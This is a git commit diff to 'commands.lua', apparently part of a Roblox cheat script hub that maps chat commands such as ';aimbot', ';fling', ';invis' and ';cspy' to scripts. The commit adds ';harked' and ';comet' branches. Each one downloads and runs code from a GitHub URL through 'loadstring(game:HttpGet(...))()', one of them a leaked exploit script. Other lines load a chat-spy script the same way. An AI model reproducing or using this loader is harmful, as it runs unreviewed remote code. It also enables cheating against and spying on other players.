2ae552ec57ca02f81e3a99d04261fc50d5fc452f
sovetskii-shashlik <kudrovmaksim29@gmail.com>
2026-04-26 06:12:59 +0300

    Update commands.lua

--- commands.lua
+++ commands.lua
@@ -1,6 +1,6 @@
 return function(scriptBox, player)
     local commands = {
-        ";dhex", ";qcmd", ";straw", ";krunox",
+        ";dhex", ";qcmd", ";straw", ";krunox", ";harked",
         ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";sfly", ";fly2", ";sfly2", ";rtt", ";rkt", ";conprint", ";caranims",
         ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bp5", ";bp6", ";bp7", ";bp8", ";bp9", ";bhtool", ";mvtool", ";grtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth", ";antierr", ";HDAcmdbar", ";AKA",
         ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";invis3", ";tel3", ";roa", ";akp1", ";akp2", ";akp3", ";keyb3", ";keyb4", ";cvb", ";ska", ";reach", ";reach2", ";reach3", ";reach4", ";hitbox", ";aimbot", ";aimlock", ";cfling", ";finger", ";finger2", ";spdmtr", ";gripfling",
@@ -44,6 +44,10 @@ a(b({Url=e}).Body)()
             loadstring(game:HttpGet("https://glot.io/snippets/h9d5rkcl47/raw/ShiftLock.lua "))()
         elseif code == ";cspy" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/CHAT%20SPY%20-%202025/ChatSpy2025.lua "))()
+        elseif code == ";harked" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()
+        elseif code == ";comet" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))()
         elseif code == ";dhex" then
             loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Destructed-hex/raw/refs/heads/main/Destructed%20hex%20gui "))()
         elseif code == ";straw" then
